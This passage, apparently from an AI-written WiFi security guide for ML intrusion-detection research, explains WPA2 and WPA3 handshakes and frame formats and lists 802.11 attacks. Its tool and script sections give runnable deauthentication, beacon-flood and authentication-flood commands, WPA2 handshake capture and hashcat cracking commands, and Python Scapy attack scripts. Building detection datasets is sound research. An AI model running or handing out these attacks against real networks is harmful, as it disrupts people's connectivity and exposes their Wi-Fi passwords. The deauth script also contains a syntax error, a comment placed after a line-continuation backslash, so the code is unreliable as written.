│             SNonce) | max(ANonce,       │
│             SNonce))                    │
└────────────────┬────────────────────────┘
                 │
       ┌─────────┼─────────┬─────────┐
       ▼         ▼         ▼         ▼
    ┌─────┐  ┌─────┐  ┌─────┐  ┌─────┐
    │ KCK │  │ KEK │  │ TK  │  │ MK  │
    │128b │  │128b │  │128b │  │128b │
    └─────┘  └─────┘  └─────┘  └─────┘
      │        │        │        │
      │        │        │        └─ MIC Key (legacy)
      │        │        └─ Temporal Key (data encryption)
      │        └─ Key Encryption Key (GTK encryption)
      └─ Key Confirmation Key (MIC for EAPOL)

┌─────────────────────────────────────────┐
│  GTK (Group Temporal Key) - 128 bits   │
│  Generated by AP                        │
│  Shared by ALL clients                  │
│  Used for broadcast/multicast frames    │
└─────────────────────────────────────────┘
```

**EAPOL Frame Structure (4-Way Handshake):**

```
┌─────────────────────────────────────────────────────┐
│         802.11 MAC Header (QoS Data)                │
├─────────────────────────────────────────────────────┤
│         LLC Header (3 bytes)                        │
│  DSAP: 0xAA, SSAP: 0xAA, Control: 0x03             │
├─────────────────────────────────────────────────────┤
│         SNAP Header (5 bytes)                       │
│  OUI: 0x000000, Type: 0x888E (EAPOL)               │
├─────────────────────────────────────────────────────┤
│         EAPOL HEADER (4 bytes)                      │
│  ├─ Version: 0x01 or 0x02                           │
│  ├─ Type: 0x03 (EAPOL-Key)                          │
│  └─ Length: Variable                                │
├─────────────────────────────────────────────────────┤
│         EAPOL-KEY FRAME                             │
│  ├─ Descriptor Type: 0x02 (RSN)                     │
│  ├─ Key Information (2 bytes)                       │
│  │   └─ Flags: Install, ACK, MIC, Secure, etc.     │
│  ├─ Key Length: 16 bytes (for CCMP)                 │
│  ├─ Replay Counter: 8 bytes                         │
│  ├─ Key Nonce: 32 bytes (ANonce or SNonce)          │
│  ├─ Key IV: 16 bytes                                │
│  ├─ Key RSC: 8 bytes                                │
│  ├─ Reserved: 8 bytes                               │
│  ├─ Key MIC: 16 bytes (or 0 for Message 1)          │
│  ├─ Key Data Length: 2 bytes                        │
│  └─ Key Data: Variable (RSN IE, GTK, etc.)          │
└─────────────────────────────────────────────────────┘
```

### **7.3 WPA3-SAE (Simultaneous Authentication of Equals)**

**Replaces 4-way handshake with Dragonfly handshake:**

```
SAE HANDSHAKE:
──────────────────────────────────────────────────────
Client                                    AP
  │                                       │
  │─── SAE Commit ────────────────────────→│
  │    [Scalar + Element (ECC point)]      │
  │                                       │
  │←── SAE Commit ─────────────────────────│
  │    [Scalar + Element]                  │
  │                                       │
  │    Both compute shared secret          │
  │    using elliptic curve crypto         │
  │                                       │
  │─── SAE Confirm ───────────────────────→│
  │    [Confirmation value]                │
  │                                       │
  │←── SAE Confirm ────────────────────────│
  │    [Confirmation value]                │
  │                                       │
  │  [PMK derived, proceed to 4-way]       │
  │                                       │

Benefits over WPA2-PSK:
✓ Forward secrecy (past sessions secure if password leaked)
✓ Resistant to offline dictionary attacks
✓ No capture-and-crack vulnerability
```

---

## **8. ATTACK SURFACES FOR YOUR ML RESEARCH**

### **8.1 Management Frame Attacks**

| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **Deauth Attack** | Management | Send forged deauth frames | Easy |
| **Disassoc Attack** | Management | Send forged disassoc frames | Easy |
| **Beacon Flood** | Management | Spam fake beacon frames | Easy |
| **SSID Cloaking** | Management | Hide SSID in beacons | Easy |
| **Evil Twin** | Management | Fake AP with same SSID | Easy |
| **Karma Attack** | Management | Respond to all probe requests | Medium |
| **Rogue AP** | Infrastructure | Unauthorized AP on network | Easy |

### **8.2 Authentication/Association Attacks**

| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **Authentication Flood** | Management | Spam auth requests | Easy |
| **Association Flood** | Management | Spam assoc requests | Easy |
| **MAC Spoofing** | MAC Layer | Impersonate legitimate client | Easy |
| **MAC Filtering Bypass** | MAC Layer | Sniff + spoof allowed MAC | Easy |

### **8.3 WPA/WPA2 Attacks**

| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **4-Way Handshake Capture** | Security | Capture handshake → offline crack | Easy |
| **Deauth + Capture** | Security | Force reconnect to capture handshake | Easy |
| **PMKID Attack** | Security | Extract PMKID from beacons (no client!) | Medium |
| **Dictionary Attack** | Security | Brute-force password from handshake | Medium |
| **Hashcat Crack** | Security | GPU-accelerated cracking | Medium |
| **KRACK** | Security | Key reinstallation attack (patched) | Hard |
| **Evil Twin + Capture** | Security | Fake AP to capture credentials | Medium |

### **8.4 Data Frame Attacks**

| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **Packet Injection** | Data | Inject malicious frames | Medium |
| **ARP Spoofing** | Network | Poison ARP cache (MITM) | Medium |
| **DNS Spoofing** | Network | Redirect DNS queries | Medium |
| **Session Hijacking** | Application | Steal session cookies | Hard |
| **Packet Sniffing** | Data | Capture unencrypted traffic | Easy |

### **8.5 DoS Attacks**

| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **CTS Flood** | Control | Spam CTS frames (block medium) | Easy |
| **RTS Flood** | Control | Spam RTS frames | Easy |
| **Null Data Flood** | Data | Spam null data frames | Easy |
| **Channel Jamming** | PHY | RF interference | Medium |
| **Beacon Flooding** | Management | Overwhelm with fake APs | Easy |

---

## **9. TOOLS FOR WiFi RESEARCH**

### **9.1 aircrack-ng Suite**

```bash
# Monitor mode
sudo airmon-ng start wlan0

# Scan for networks
sudo airodump-ng wlan0mon

# Capture specific AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack (force handshake capture)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA2 handshake
sudo aircrack-ng -w wordlist.txt capture-01.cap

# Test injection
sudo aireplay-ng --test wlan0mon
```

### **9.2 Wireshark Filters**

```
# Display filters for WiFi analysis
wlan.fc.type == 0                 # Management frames
wlan.fc.type == 1                 # Control frames
wlan.fc.type == 2                 # Data frames

wlan.fc.type_subtype == 0x08      # Beacon frames
wlan.fc.type_subtype == 0x04      # Probe Request
wlan.fc.type_subtype == 0x05      # Probe Response
wlan.fc.type_subtype == 0x0b      # Authentication
wlan.fc.type_subtype == 0x00      # Association Request
wlan.fc.type_subtype == 0x0c      # Deauthentication
wlan.fc.type_subtype == 0x0a      # Disassociation

wlan.bssid == aa:bb:cc:dd:ee:ff   # Specific AP
wlan.sa == aa:bb:cc:dd:ee:ff      # Source address
wlan.da == aa:bb:cc:dd:ee:ff      # Destination address

eapol                             # EAPOL frames (handshake!)
wlan.rsn.ie.group_cipher_suite    # WPA2 info

# WPA handshake
eapol.keydes.msgnr == 1           # Message 1
eapol.keydes.msgnr == 2           # Message 2
eapol.keydes.msgnr == 3           # Message 3
eapol.keydes.msgnr == 4           # Message 4
```

### **9.3 Scapy (Python)**

```python
from scapy.all import *

# Craft beacon frame
dot11 = Dot11(type=0, subtype=8,
              addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
              addr2="aa:bb:cc:dd:ee:ff",  # AP MAC
              addr3="aa:bb:cc:dd:ee:ff")  # BSSID

beacon = Dot11Beacon(cap="ESS+privacy")

essid = Dot11Elt(ID="SSID", info="FakeNetwork", len=len("FakeNetwork"))

frame = RadioTap()/dot11/beacon/essid

# Send
sendp(frame, iface="wlan0mon", inter=0.1, loop=1)

# Craft deauth frame
deauth = Dot11(type=0, subtype=12,
               addr1="11:22:33:44:55:66",  # Client
               addr2="aa:bb:cc:dd:ee:ff",  # AP
               addr3="aa:bb:cc:dd:ee:ff")  # BSSID
deauth_packet = RadioTap()/deauth/Dot11Deauth(reason=7)

sendp(deauth_packet, iface="wlan0mon", count=100, inter=0.01)
```

### **9.4 MDK4 (Attack Tool)**

```bash
# Beacon flooding (create fake APs)
sudo mdk4 wlan0mon b -f /usr/share/wordlists/ssids.txt -a -s 1000

# Deauth attack (all clients on channel 6)
sudo mdk4 wlan0mon d -c 6

# Authentication DoS
sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF -m

# EAPOL start flood
sudo mdk4 wlan0mon e -t AA:BB:CC:DD:EE:FF
```

### **9.5 Hashcat (WPA2 Cracking)**

```bash
# Convert .cap to .hccapx format
/usr/lib/hashcat-utils/cap2hccapx.bin capture.cap capture.hccapx

# GPU-accelerated cracking
hashcat -m 22000 -a 0 capture.hccapx wordlist.txt

# Mask attack (8 digits)
hashcat -m 22000 -a 3 capture.hccapx ?d?d?d?d?d?d?d?d

# Combinator attack
hashcat -m 22000 -a 1 capture.hccapx dict1.txt dict2.txt
```

---

## **10. ATTACK SCRIPT EXAMPLES**

### **10.1 Deauth Attack (Python)**

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

def deauth_attack(ap_mac, client_mac, iface="wlan0mon", count=100):
    """
    Send deauth frames to disconnect client from AP
    """
    # Deauth from AP to client
    deauth1 = RadioTap() / \
              Dot11(type=0, subtype=12,
                    addr1=client_mac,   # Destination (client)
                    addr2=ap_mac,       # Source (AP)
                    addr3=ap_mac) / \   # BSSID
              Dot11Deauth(reason=7)     # Reason: Class 3 frame from non-assoc STA
    
    # Deauth from client to AP (bidirectional)
    deauth2 = RadioTap() / \
              Dot11(type=0, subtype=12,
                    addr1=ap_mac,       # Destination (AP)
                    addr2=client_mac,   # Source (client)
                    addr3=ap_mac) / \   # BSSID
              Dot11Deauth(reason=3)     # Reason: Deauth because leaving
    
    print(f"[*] Sending {count} deauth frames...")
    print(f"    AP: {ap_mac}")
    print(f"    Client: {client_mac}")
    
    for i in range(count):
        sendp(deauth1, iface=iface, verbose=False)
        sendp(deauth2, iface=iface, verbose=False)
        if i % 10 == 0:
            print(f"[+] Sent {i}/{count} deauth frames")
    
    print("[+] Deauth attack complete!")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <AP_MAC> <CLIENT_MAC>")
        print("Example: python3 deauth.py AA:BB:CC:DD:EE:FF 11:22:33:44:55:66")
        sys.exit(1)
    
    ap = sys.argv[1]
    client = sys.argv[2]
    deauth_attack(ap, client, count=100)
```

### **10.2 Beacon Flooding (Python)**

```python
#!/usr/bin/env python3
from scapy.all import *
import random
import string

def beacon_flood(iface="wlan0mon", count=1000):
    """
    Create fake APs by flooding beacons with random SSIDs
    """
    print(f"[*] Starting beacon flood on {iface}")
    
    for i in range(count):
        # Random SSID
        ssid = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        # Random MAC
        mac = ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])
        
        # Craft beacon
        dot11 = Dot11(type=0, subtype=8,
                      addr1="ff:ff:ff:ff:ff:ff",
                      addr2=mac,
                      addr3=mac)
        
        beacon = Dot11Beacon(cap="ESS+privacy")
        
        # Random channel
        channel = random.randint(1, 11)
        
        essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
        dsset = Dot11Elt(ID="DSset", info=chr(channel))
        
        # RSN (WPA2)
        rsn = Dot11Elt(ID="RSNinfo", info=(
            '\x01\x00'                # RSN Version
            '\x00\x0f\xac\x04'        # Group Cipher: CCMP
            '\x01\x00\x00\x0f\xac\x04'# Pairwise Cipher: CCMP
            '\x01\x00\x00\x0f\xac\x02'# AKM: PSK
            '\x00\x00'                # RSN Capabilities
        ))
        
        frame = RadioTap()/dot11/beacon/essid/dsset/rsn
        
        sendp(frame, iface=iface, verbose=False)
        
        if i % 100 == 0:
            print(f"[+] Created {i}/{count} fake APs")
    
    print("[+] Beacon flood complete!")

if __name__ == "__main__":
    beacon_flood(count=1000)
```

### **10.3 Handshake Capture (Automated)**

```python
#!/usr/bin/env python3
from scapy.all import *
import time

captured_handshakes = {}

def packet_handler(pkt):
    """
    Monitor for EAPOL frames (WPA handshake)
    """
    if pkt.haslayer(EAPOL):
        if pkt.haslayer(Dot11):
            bssid = pkt[Dot11].addr3
            client = pkt[Dot11].addr1 if pkt[Dot11].addr1 != bssid else pkt[Dot11].addr2
            
            if bssid not in captured_handshakes:
                captured_handshakes[bssid] = {'clients': {}}
            
            if client not in captured_handshakes[bssid]['clients']:
                captured_handshakes[bssid]['clients'][client] = []
            
            # Determine message number
            key_info = pkt[EAPOL].key_info
            
            if key_info & 0x0008:  # MIC flag
                if key_info & 0x0100:  # Install flag
                    msg_num = 3
                else:
                    msg_num = 2 if key_info & 0x0200 else 4  # Key ACK flag
            else:
                msg_num = 1
            
            captured_handshakes[bssid]['clients'][client].append(msg_num)
            
            print(f"\n[+] EAPOL Message {msg_num}")
            print(f"    BSSID: {bssid}")
            print(f"    Client: {client}")
            
            # Check if we have full handshake (1,2,3,4 or 2,3,4)
            msgs = captured_handshakes[bssid]['clients'][client]
            if len(set(msgs)) >= 3 and (2 in msgs and 3 in msgs):
                print(f"\n[!] FULL HANDSHAKE CAPTURED!")
                print(f"    BSSID: {bssid}")
                print(f"    Client: {client}")
                # Save to file
                wrpcap(f"handshake_{bssid.replace(':', '')}.pcap", pkt)

def capture_handshake(target_ap=None, iface="wlan0mon"):
    """
    Capture WPA handshakes on specified interface
    """
    print(f"[*] Monitoring for WPA handshakes on {iface}")
    if target_ap:
        print(f"[*] Target AP: {target_ap}")
        filter_str = f"ether host {target_ap}"
    else:
        filter_str = None
    
    sniff(iface=iface, prn=packet_handler, filter=filter_str, store=False)

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else None
    capture_handshake(target_ap=target)
```

---

## **11. DATASET COLLECTION STRATEGY**

### **11.1 Benign Traffic Patterns**

```
Normal WiFi Operations:
├── Beacon frames (periodic, every ~100 ms)
├── Probe Request/Response (client scanning)
├── Authentication (Open System, 2 frames)
├── Association Request/Response
├── 4-way handshake (EAPOL, 4 messages)
├── Data frames (QoS, normal traffic)
│   ├── HTTP/HTTPS
│   ├── DNS queries
│   ├── ARP
│   └── ICMP
├── Block ACK (802.11n aggregation)
├── Reassociation (roaming between APs)
└── Normal disconnects (Disassoc reason 8, 36)
```

### **11.2 Attack Traffic Patterns**

```
Attack Scenarios:
├── Deauth floods (high rate, reason code 7)
├── Disassoc floods (high rate, various reasons)
├── Beacon floods (many fake APs)
├── Authentication floods (repeated auth attempts)
├── Association floods (repeated assoc attempts)
├── Null data floods (high rate, no payload)
├── RTS/CTS floods (control frame spam)
├── Malformed frames (invalid lengths, bad FCS)
├── Channel hopping attacks
├── Evil Twin patterns (duplicate SSID)
├── PMKID capture attempts
└── Unusual frame sequences (out of order)
```

### **11.3 Feature Extraction**

```
Per-Frame Features:
- Timestamp
- Frame type (Management/Control/Data)
- Frame subtype (Beacon, Deauth, QoS Data, etc.)
- Source MAC
- Destination MAC
- BSSID
- Frame length
- RSSI (signal strength)
- Channel number
- Data rate (Mbps)
- Retry flag
- More Fragments flag
- Protected flag (encrypted?)
- Sequence number
- Frame Control flags
- Reason code (for Deauth/Disassoc)
- Status code (for Auth/Assoc)

Flow-Based Features:
- Frames per second (FPS)
- Bytes per second (BPS)
- Unique MAC count
- Beacon interval variance
- Deauth/Disassoc rate
- Authentication attempt rate
- Retry rate
- Average frame size
- Inter-frame arrival time
- Frame type distribution
- Control frame percentage

Time-Series Features:
- Moving average of RSSI
- Frame rate over time windows
- Burst detection (sudden spike in frames)
- Sequence number gaps
- Channel change frequency
```

---

## **12. RASPBERRY PI 5 CONSIDERATIONS**

### **12.1 brcmfmac Driver Limitations**

```
Your Raspberry Pi 5 WiFi Chipset:
├── Driver: brcmfmac (Broadcom)
├── Chipset: BCM43455 or similar
└── Firmware: Nexmon for monitor mode + injection

Known Limitations:
✗ Packet injection limited to 25-30 packets per burst
✗ Firmware can crash with aggressive injection
✗ Monitor mode may miss frames at high rates
✓ Passive sniffing works well
✓ Can capture handshakes reliably

Workarounds:
- Use paced attacks (delays between injections)
- Smaller burst sizes
- Cool-down periods
- External WiFi adapter (recommended for serious research)
```

### **12.2 Recommended External Adapters**

```
┌──────────────────────────────────────────────────┐
│  Alfa AWUS036NHA (Atheros AR9271)                │
│  • Best for packet injection                     │
│  • Full monitor mode support                     │
│  • ath9k_htc driver (native Linux)               │
│  • ~$40                                          │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│  Alfa AWUS036ACH (Realtek RTL8812AU)             │
│  • Dual-band (2.4 + 5 GHz)                       │
│  • 802.11ac support                              │
│  • Good injection                                │
│  • ~$50                                          │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│  TP-Link TL-WN722N v1 (Atheros AR9271)           │
│  • Budget option (~$15-20)                       │
│  • ONLY v1! v2/v3 use Realtek (poor support)     │
│  • Check hardware version before buying!         │
└──────────────────────────────────────────────────┘
```

---

## **13. COMPARISON: WiFi vs BLE vs Zigbee vs LoRa**

| Aspect | WiFi | BLE | Zigbee | LoRa |
|--------|------|-----|--------|------|
| **Standard** | IEEE 802.11 | Bluetooth SIG | IEEE 802.15.4 | LoRa Alliance |
| **Frequency** | 2.4/5/6 GHz | 2.4 GHz | 2.4 GHz | Sub-GHz |
| **Modulation** | OFDM/OFDMA | GFSK | O-QPSK | CSS |
| **Data Rate** | 1-9600 Mbps | 1-2 Mbps | 250 kbps | 0.3-50 kbps |
| **Range** | 50-100m | 10-100m | 10-100m | 2-15+ km |
| **Topology** | Star (AP-Client) | Star | Mesh | Star-of-stars |
| **Power** | High | Ultra-low | Low | Ultra-low |
| **Channels** | 14 (2.4G), 24+(5G) | 40 | 16 | 8-64 |
| **Security** | WPA2/WPA3 | AES-CCM | AES-CCM* | AES-128 |
| **Auth** | 4-way handshake | Pairing | Transport Key | OTAA |
| **Use Case** | Internet, Video | Wearables | Automation | WAN IoT |
| **Discovery** | Beacon/Probe | ADV_IND | Beacon | Join Request |
| **Attack Ease** | Easy (Deauth) | Medium | Medium | Hard |

---

## **14. QUICK REFERENCE: FRAME TYPE CHEAT SHEET**

```
FRAME TYPE QUICK LOOKUP:

Management Frames (Type=00):
├── Beacon (0x08): Periodic AP advertisement
├── Probe Req (0x04): Client scanning
├── Probe Resp (0x05): AP response to scan
├── Auth (0x0B): Authentication exchange
├── Deauth (0x0C): Forceful disconnect ⚠️
├── Assoc Req (0x00): Join network
├── Assoc Resp (0x01): Join granted
├── Reassoc Req (0x02): Roaming
├── Disassoc (0x0A): Break association ⚠️
└── Action (0x0D): Various management actions

Control Frames (Type=01):
├── RTS (0x1B): Request To Send
├── CTS (0x1C): Clear To Send
├── ACK (0x1D): Acknowledgment
└── Block ACK (0x19): Aggregated ACK

Data Frames (Type=10):
├── Data (0x20): Basic data frame
├── QoS Data (0x28): Most common
├── Null (0x24): No payload (keep-alive)
└── QoS Null (0x2C): QoS keep-alive

Special Frames:
├── EAPOL (EtherType 0x888E): WPA handshake
├── ARP (EtherType 0x0806): Address resolution
└── IP (EtherType 0x0800): Network layer
```

---

That's the comprehensive WiFi breakdown!

**Key Takeaways:**
1. **WiFi = 802.11 MAC + PHY layers** (Infrastructure star topology)
2. **Management frames** = Network control (beacons, auth, assoc, deauth)
3. **OFDM modulation** = Multiple subcarriers for high throughput
4. **WPA2 4-way handshake** = Key exchange for encryption
5. **Deauth/Disassoc** = Major attack vector (unencrypted!)
6. **Three address fields** = Destination, Source, BSSID

**For Your Security Research:**
- Deauth attacks easiest to implement
- Handshake capture → offline cracking
- Beacon flooding for DoS
- Evil Twin for credential harvesting
- Raspberry Pi 5 limitations: use external adapter for serious injection

**Next Steps:**
1. Set up monitor mode (airmon-ng or Nexmon)
2. Capture benign traffic (beacons, associations, data)
3. Implement attacks (deauth, beacon flood, handshake capture)
4. Build dataset with labeled traffic
5. Extract features (frame types, rates, sequence anomalies)
6. Train ML classifier (Random Forest, LSTM)

**Questions:**
- Want detailed Raspberry Pi 5 + Nexmon setup guide?
- Need external WiFi adapter recommendations?
- Multi-protocol dataset integration strategy?
- Attack prioritization for ML training?

What's your focus for the WiFi research? 🎯

---

**Related**:
- [[WiFi/README|WiFi Home]]
- [[WiFi/Attacks/01-deauth-analysis|Deauth Attack Deep Dive]]
- [[WiFi/Security/01-wpa2-handshake|WPA2 Handshake Analysis]]
- [[README|Home]] • [[INDEX|Full Index]]
